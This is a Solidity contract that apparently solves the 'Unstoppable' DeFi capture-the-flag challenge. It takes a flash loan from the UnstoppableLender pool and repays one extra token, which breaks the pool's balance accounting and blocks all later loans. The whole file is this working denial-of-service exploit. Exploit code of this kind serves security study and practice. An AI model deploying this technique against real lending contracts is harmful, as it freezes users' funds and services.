// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title AttackerContract
 * @author Edoardo Ierina
 */
contract AttackerContract {

    UnstoppableLender private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    // Pool will call this function during the flash loan
    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");

        // Return an excess of tokens (+1) to the pool
        require(IERC20(tokenAddress).transfer(msg.sender, 1 + amount), "Transfer of tokens failed");
    }

    function executeAttack(address tokenAddress, uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        require(IERC20(tokenAddress).balanceOf(address(this)) > 0, "Transfer at least one token to this contract first");

        pool.flashLoan(amount);
    }
}